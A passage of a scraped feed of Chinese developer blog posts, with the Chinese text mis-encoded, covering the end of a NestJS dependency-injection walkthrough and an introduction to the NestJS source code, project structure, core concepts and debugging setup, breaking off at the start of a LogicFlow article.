<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CatsService</span> {
  <span class="hljs-meta">@Inject</span>(<span class="hljs-title class_">LoggerService</span>)
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> <span class="hljs-attr">logger</span>: <span class="hljs-title class_">LoggerService</span>;
}
</code></pre>
<p>å®ç°ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/core/injector/injector.ts</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">loadPropertiesOnInstance</span>(<span class="hljs-params">
  instance: <span class="hljs-built_in">object</span>,
  wrapper: InstanceWrapper,
  moduleRef: Module,
  contextId: ContextId,
</span>) {
  <span class="hljs-keyword">const</span> properties = wrapper.<span class="hljs-title function_">getPropertiesMetadata</span>();

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> property <span class="hljs-keyword">of</span> properties) {
    <span class="hljs-keyword">const</span> { key, <span class="hljs-attr">wrapper</span>: propertyWrapper } = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">lookupComponent</span>(
      property.<span class="hljs-property">name</span>,
      moduleRef,
      contextId,
      wrapper,
    );
    instance[key] = propertyWrapper.<span class="hljs-property">instance</span>;
  }
}
</code></pre>
<h3 data-id="heading-20">æ€»ç»“</h3>
<p>NestJS ä¾èµ–æ³¨å…¥ç³»ç»Ÿçš„æ ¸å¿ƒï¼š</p>
<ol>
<li><strong>å…ƒæ•°æ®é©±åŠ¨</strong>ï¼šé€šè¿‡ <code>reflect-metadata</code> è·å–ç±»å‹ä¿¡æ¯</li>
<li><strong>InstanceWrapper</strong>ï¼šåŒ…è£…æ¯ä¸ªå¯æ³¨å…¥å®ä¾‹</li>
<li><strong>Module</strong>ï¼šç®¡ç† providersã€controllersã€importsã€exports</li>
<li><strong>Injector</strong>ï¼šé€’å½’è§£æä¾èµ–ï¼Œå®ä¾‹åŒ–å¯¹è±¡</li>
<li><strong>ä½œç”¨åŸŸ</strong>ï¼šæ”¯æŒå•ä¾‹ã€ç¬æ€ã€è¯·æ±‚ä¸‰ç§ä½œç”¨åŸŸ</li>
<li><strong>å¾ªç¯ä¾èµ–</strong>ï¼šé€šè¿‡ <code>forwardRef</code> å»¶è¿Ÿè§£æ</li>
</ol>
<p>ä¸‹ä¸€ç¯‡æˆ‘ä»¬å°†åˆ†ææ¨¡å—ç³»ç»Ÿçš„å®ç°ã€‚</p>
<hr/>
<blockquote>
<p>ğŸ“¦ æºç ä½ç½®ï¼š<code>packages/core/injector/</code></p>
<p>ä¸‹ä¸€ç¯‡ï¼šNestJS æ¨¡å—ç³»ç»Ÿ</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é¡¹ç›®ä»‹ç»ä¸ç¯å¢ƒæ­å»º]]></title>    <link>https://juejin.cn/post/7589201772117491718</link>    <guid>https://juejin.cn/post/7589201772117491718</guid>    <pubDate>2025-12-29T09:32:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589201772117491718" data-draft-id="7589126217249898537" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é¡¹ç›®ä»‹ç»ä¸ç¯å¢ƒæ­å»º"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-29T09:32:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å€Ÿä¸ªç«er"/> <meta itemprop="url" content="https://juejin.cn/user/2225067265915783"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é¡¹ç›®ä»‹ç»ä¸ç¯å¢ƒæ­å»º
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2225067265915783/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å€Ÿä¸ªç«er
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:32:28.000Z" title="Mon Dec 29 2025 09:32:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">NestJS æºç è§£æï¼šé¡¹ç›®ä»‹ç»ä¸ç¯å¢ƒæ­å»º</h2>
<blockquote>
<p>NestJS æ˜¯ Node.js æœ€æµè¡Œçš„ä¼ä¸šçº§æ¡†æ¶ï¼Œæœ¬ç³»åˆ—å°†æ·±å…¥æºç ï¼Œæ­ç§˜å…¶è®¾è®¡æ€æƒ³ã€‚</p>
</blockquote>
<h3 data-id="heading-1">NestJS æ˜¯ä»€ä¹ˆ</h3>
<p>NestJS æ˜¯ä¸€ä¸ªç”¨äºæ„å»ºé«˜æ•ˆã€å¯æ‰©å±•çš„ Node.js æœåŠ¡ç«¯åº”ç”¨çš„æ¡†æ¶ã€‚å®ƒä½¿ç”¨ TypeScript æ„å»ºï¼Œèåˆäº† OOPã€FPã€FRP çš„ç¼–ç¨‹èŒƒå¼ã€‚</p>
<p>æ ¸å¿ƒç‰¹ç‚¹ï¼š</p>
<ul>
<li><strong>æ¨¡å—åŒ–æ¶æ„</strong>ï¼šå€Ÿé‰´ Angular çš„æ¨¡å—ç³»ç»Ÿ</li>
<li><strong>ä¾èµ–æ³¨å…¥</strong>ï¼šå†…ç½® IoC å®¹å™¨</li>
<li><strong>è£…é¥°å™¨é©±åŠ¨</strong>ï¼šå¤§é‡ä½¿ç”¨ TypeScript è£…é¥°å™¨</li>
<li><strong>å¹³å°æ— å…³</strong>ï¼šæ”¯æŒ Expressã€Fastify ç­‰åº•å±‚æ¡†æ¶</li>
</ul>
<h3 data-id="heading-2">æºç ä»“åº“</h3>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/nestjs/nest.git
<span class="hljs-built_in">cd</span> nest
npm install
npm run build
</code></pre>
<p>å½“å‰ç‰ˆæœ¬ï¼šv11.1.10</p>
<h3 data-id="heading-3">é¡¹ç›®ç»“æ„</h3>
<pre><code class="hljs language-bash" lang="bash">nest/
â”œâ”€â”€ packages/
â”‚   â”œâ”€â”€ common/           <span class="hljs-comment"># å…¬å…±æ¨¡å—ï¼ˆè£…é¥°å™¨ã€æ¥å£ã€å·¥å…·ï¼‰</span>
â”‚   â”œâ”€â”€ core/             <span class="hljs-comment"># æ ¸å¿ƒæ¨¡å—ï¼ˆDIã€è·¯ç”±ã€ç”Ÿå‘½å‘¨æœŸï¼‰</span>
â”‚   â”œâ”€â”€ microservices/    <span class="hljs-comment"># å¾®æœåŠ¡æ”¯æŒ</span>
â”‚   â”œâ”€â”€ platform-express/ <span class="hljs-comment"># Express é€‚é…å™¨</span>
â”‚   â”œâ”€â”€ platform-fastify/ <span class="hljs-comment"># Fastify é€‚é…å™¨</span>
â”‚   â”œâ”€â”€ testing/          <span class="hljs-comment"># æµ‹è¯•å·¥å…·</span>
â”‚   â””â”€â”€ websockets/       <span class="hljs-comment"># WebSocket æ”¯æŒ</span>
â”‚
â”œâ”€â”€ integration/          <span class="hljs-comment"># é›†æˆæµ‹è¯•</span>
â”œâ”€â”€ sample/               <span class="hljs-comment"># ç¤ºä¾‹é¡¹ç›®</span>
â””â”€â”€ tools/                <span class="hljs-comment"># æ„å»ºå·¥å…·</span>
</code></pre>
<h3 data-id="heading-4">æ ¸å¿ƒåŒ…è¯´æ˜</h3>
<h4 data-id="heading-5">@nestjs/common</h4>
<p>å…¬å…±æ¨¡å—ï¼ŒåŒ…å«ï¼š</p>
<ul>
<li>è£…é¥°å™¨ï¼š<code>@Module</code>ã€<code>@Controller</code>ã€<code>@Injectable</code>ã€<code>@Get</code>ã€<code>@Post</code> ç­‰</li>
<li>æ¥å£ï¼š<code>NestModule</code>ã€<code>CanActivate</code>ã€<code>PipeTransform</code> ç­‰</li>
<li>å¼‚å¸¸ï¼š<code>HttpException</code>ã€<code>BadRequestException</code> ç­‰</li>
<li>å·¥å…·å‡½æ•°</li>
</ul>
<h4 data-id="heading-6">@nestjs/core</h4>
<p>æ ¸å¿ƒè¿è¡Œæ—¶ï¼ŒåŒ…å«ï¼š</p>
<ul>
<li><code>NestFactory</code>ï¼šåº”ç”¨å·¥å‚</li>
<li><code>NestContainer</code>ï¼šIoC å®¹å™¨</li>
<li><code>Injector</code>ï¼šä¾èµ–æ³¨å…¥å™¨</li>
<li><code>DependenciesScanner</code>ï¼šæ¨¡å—æ‰«æå™¨</li>
<li><code>RouterExplorer</code>ï¼šè·¯ç”±æ¢ç´¢å™¨</li>
<li>ç”Ÿå‘½å‘¨æœŸé’©å­</li>
</ul>
<h4 data-id="heading-7">@nestjs/platform-express</h4>
<p>Express å¹³å°é€‚é…å™¨ï¼Œå°† NestJS çš„æŠ½è±¡æ˜ å°„åˆ° Expressã€‚</p>
<h3 data-id="heading-8">æ ¸å¿ƒæ¦‚å¿µ</h3>
<h4 data-id="heading-9">1. æ¨¡å— (Module)</h4>
<p>æ¨¡å—æ˜¯ç»„ç»‡ä»£ç çš„åŸºæœ¬å•å…ƒï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Module</span>({
  <span class="hljs-attr">imports</span>: [<span class="hljs-title class_">DatabaseModule</span>],
  <span class="hljs-attr">controllers</span>: [<span class="hljs-title class_">CatsController</span>],
  <span class="hljs-attr">providers</span>: [<span class="hljs-title class_">CatsService</span>],
  <span class="hljs-attr">exports</span>: [<span class="hljs-title class_">CatsService</span>],
})
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CatsModule</span> {}
</code></pre>
<h4 data-id="heading-10">2. æ§åˆ¶å™¨ (Controller)</h4>
<p>å¤„ç† HTTP è¯·æ±‚ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Controller</span>(<span class="hljs-string">'cats'</span>)
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CatsController</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> catsService: CatsService</span>) {}

  <span class="hljs-meta">@Get</span>()
  <span class="hljs-title function_">findAll</span>(): <span class="hljs-title class_">Cat</span>[] {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">catsService</span>.<span class="hljs-title function_">findAll</span>();
  }
}
</code></pre>
<h4 data-id="heading-11">3. æä¾›è€… (Provider)</h4>
<p>å¯æ³¨å…¥çš„æœåŠ¡ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CatsService</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">cats</span>: <span class="hljs-title class_">Cat</span>[] = [];

  <span class="hljs-title function_">findAll</span>(): <span class="hljs-title class_">Cat</span>[] {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">cats</span>;
  }
}
</code></pre>
<h4 data-id="heading-12">4. ä¸­é—´ä»¶ (Middleware)</h4>
<p>è¯·æ±‚å¤„ç†ç®¡é“ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoggerMiddleware</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">NestMiddleware</span> {
  <span class="hljs-title function_">use</span>(<span class="hljs-params">req: Request, res: Response, next: NextFunction</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Request...'</span>);
    <span class="hljs-title function_">next</span>();
  }
}
</code></pre>
<h4 data-id="heading-13">5. å®ˆå« (Guard)</h4>
<p>æƒé™æ§åˆ¶ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AuthGuard</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CanActivate</span> {
  <span class="hljs-title function_">canActivate</span>(<span class="hljs-attr">context</span>: <span class="hljs-title class_">ExecutionContext</span>): <span class="hljs-built_in">boolean</span> {
    <span class="hljs-keyword">const</span> request = context.<span class="hljs-title function_">switchToHttp</span>().<span class="hljs-title function_">getRequest</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">validateRequest</span>(request);
  }
}
</code></pre>
<h4 data-id="heading-14">6. ç®¡é“ (Pipe)</h4>
<p>æ•°æ®è½¬æ¢å’ŒéªŒè¯ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ValidationPipe</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">PipeTransform</span> {
  <span class="hljs-title function_">transform</span>(<span class="hljs-params">value: <span class="hljs-built_in">any</span>, metadata: ArgumentMetadata</span>) {
    <span class="hljs-keyword">return</span> value;
  }
}
</code></pre>
<h4 data-id="heading-15">7. æ‹¦æˆªå™¨ (Interceptor)</h4>
<p>AOP åˆ‡é¢ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoggingInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">NestInterceptor</span> {
  <span class="hljs-title function_">intercept</span>(<span class="hljs-attr">context</span>: <span class="hljs-title class_">ExecutionContext</span>, <span class="hljs-attr">next</span>: <span class="hljs-title class_">CallHandler</span>): <span class="hljs-title class_">Observable</span>&lt;<span class="hljs-built_in">any</span>&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Before...'</span>);
    <span class="hljs-keyword">return</span> next.<span class="hljs-title function_">handle</span>().<span class="hljs-title function_">pipe</span>(<span class="hljs-title function_">tap</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'After...'</span>)));
  }
}
</code></pre>
<h3 data-id="heading-16">è¯·æ±‚å¤„ç†æµç¨‹</h3>
<pre><code class="hljs language-scss" lang="scss">Request
   â†“
Middleware
   â†“
Guards
   â†“
Interceptors (before)
   â†“
Pipes
   â†“
Route Handler
   â†“
Interceptors (after)
   â†“
Exception Filters
   â†“
Response
</code></pre>
<h3 data-id="heading-17">ç³»åˆ—æ–‡ç« </h3>
<p>æœ¬ç³»åˆ—å°†æ·±å…¥åˆ†æ NestJS æºç ï¼š</p>
<ol>
<li><strong>é¡¹ç›®ä»‹ç»</strong>ï¼ˆæœ¬æ–‡ï¼‰- äº†è§£é¡¹ç›®ç»“æ„å’Œæ ¸å¿ƒæ¦‚å¿µ</li>
<li><strong>æ¶æ„æ€»è§ˆ</strong> - NestFactory å¯åŠ¨æµç¨‹</li>
<li><strong>ä¾èµ–æ³¨å…¥</strong> - IoC å®¹å™¨å’Œ Injector å®ç°</li>
<li><strong>æ¨¡å—ç³»ç»Ÿ</strong> - Module æ‰«æå’ŒåŠ è½½</li>
<li><strong>è£…é¥°å™¨åŸç†</strong> - å…ƒæ•°æ®å­˜å‚¨æœºåˆ¶</li>
<li><strong>è·¯ç”±ç³»ç»Ÿ</strong> - è¯·æ±‚åˆ†å‘å’Œå¤„ç†</li>
<li><strong>ä¸­é—´ä»¶æœºåˆ¶</strong> - ä¸­é—´ä»¶æ³¨å†Œå’Œæ‰§è¡Œ</li>
<li><strong>AOP å®ç°</strong> - Guardã€Pipeã€Interceptor</li>
</ol>
<h3 data-id="heading-18">è°ƒè¯•æŠ€å·§</h3>
<h4 data-id="heading-19">1. ä½¿ç”¨ç¤ºä¾‹é¡¹ç›®</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> sample/01-cats-app
npm install
npm run start:dev
</code></pre>
<h4 data-id="heading-20">2. æ–­ç‚¹è°ƒè¯•</h4>
<p>åœ¨ VS Code ä¸­é…ç½® launch.jsonï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"request"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"launch"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Debug Nest"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"runtimeArgs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"-r"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"ts-node/register"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"${workspaceFolder}/sample/01-cats-app/src/main.ts"</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-21">3. å…³é”®æ–­ç‚¹ä½ç½®</h4>






























<table><thead><tr><th>åœºæ™¯</th><th>æ–‡ä»¶</th><th>å‡½æ•°</th></tr></thead><tbody><tr><td>åº”ç”¨åˆ›å»º</td><td><code>core/nest-factory.ts</code></td><td><code>create</code></td></tr><tr><td>æ¨¡å—æ‰«æ</td><td><code>core/scanner.ts</code></td><td><code>scan</code></td></tr><tr><td>ä¾èµ–æ³¨å…¥</td><td><code>core/injector/injector.ts</code></td><td><code>loadInstance</code></td></tr><tr><td>è·¯ç”±æ³¨å†Œ</td><td><code>core/router/router-explorer.ts</code></td><td><code>explore</code></td></tr></tbody></table>
<h3 data-id="heading-22">ä¸‹ä¸€æ­¥</h3>
<p>ç¯å¢ƒå‡†å¤‡å¥½äº†ï¼Œä¸‹ä¸€ç¯‡æˆ‘ä»¬å°†åˆ†æ NestJS çš„å¯åŠ¨æµç¨‹ï¼Œçœ‹çœ‹ <code>NestFactory.create()</code> èƒŒåå‘ç”Ÿäº†ä»€ä¹ˆã€‚</p>
<hr/>
<blockquote>
<p>ğŸ“¦ æºç åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnestjs%2Fnest" target="_blank" title="https://github.com/nestjs/nest" ref="nofollow noopener noreferrer">github.com/nestjs/nest</a></p>
<p>ä¸‹ä¸€ç¯‡ï¼šNestJS æ¶æ„æ€»è§ˆ</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LogicFlow äº¤äº’æ–°ä½“éªŒï¼šè®©é”šç‚¹"æ´»"èµ·æ¥ï¼Œé¼ æ ‡è·ŸéšåŠ¨æ•ˆå®æˆ˜ï¼ğŸ§²]]></title>    <link>https://juejin.cn/post/7589107312112648201</link>    <guid>https://juejin.cn/post/7589107312112648201</guid>    <pubDate>2025-12-29T10:25:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589107312112648201" data-draft-id="7588799600166830090" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LogicFlow äº¤äº’æ–°ä½“éªŒï¼šè®©é”šç‚¹&quot;æ´»&quot;èµ·æ¥ï¼Œé¼ æ ‡è·ŸéšåŠ¨æ•ˆå®æˆ˜ï¼ğŸ§²"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,Vue.js"/> <meta itemprop="datePublished" content="2025-12-29T10:25:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ©™æŸäºº"/> <meta itemprop="url" content="https://juejin.cn/user/1908407919184670"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LogicFlow äº¤äº’æ–°ä½“éªŒï¼šè®©é”šç‚¹"æ´»"èµ·æ¥ï¼Œé¼ æ ‡è·ŸéšåŠ¨æ•ˆå®æˆ˜ï¼ğŸ§²
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1908407919184670/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ©™æŸäºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T10:25:26.000Z" title="Mon Dec 29 2025 10:25:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
